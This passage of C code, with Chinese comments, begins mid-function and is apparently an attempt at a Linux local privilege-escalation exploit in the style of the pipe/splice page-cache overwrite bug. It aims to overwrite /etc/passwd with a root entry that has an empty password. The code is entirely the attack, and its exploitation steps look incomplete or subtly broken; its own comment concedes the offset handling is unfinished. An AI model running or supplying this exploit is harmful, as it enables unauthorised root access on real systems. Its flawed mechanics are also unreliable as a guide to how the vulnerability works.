    const char *target = "/etc/passwd";
    const char *payload = "root::0:0:root:/root:/bin/bash\n"; // 清空密码字段
    int fd = open(target, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 创建管道
    int p[2];
    if (pipe(p) < 0) {
        perror("pipe");
        return 1;
    }

    // 使用splice将文件内容映射到管道写端
    loff_t offset = 0;
    ssize_t n = splice(fd, &offset, p[1], NULL, 4096, 0);
    if (n < 0) {
        perror("splice");
        return 1;
    }

    // 关闭文件描述符，避免干扰
    close(fd);

    // 利用漏洞：向管道写端写入payload，覆盖文件内容
    // 注意：需要确保写入位置正确，这里简单覆盖整个文件
    // 实际利用中需要计算偏移
    write(p[1], payload, strlen(payload));

    // 关闭管道
    close(p[0]);
    close(p[1]);

    printf("Done. Check %s\n", target);
    return 0;
}
```

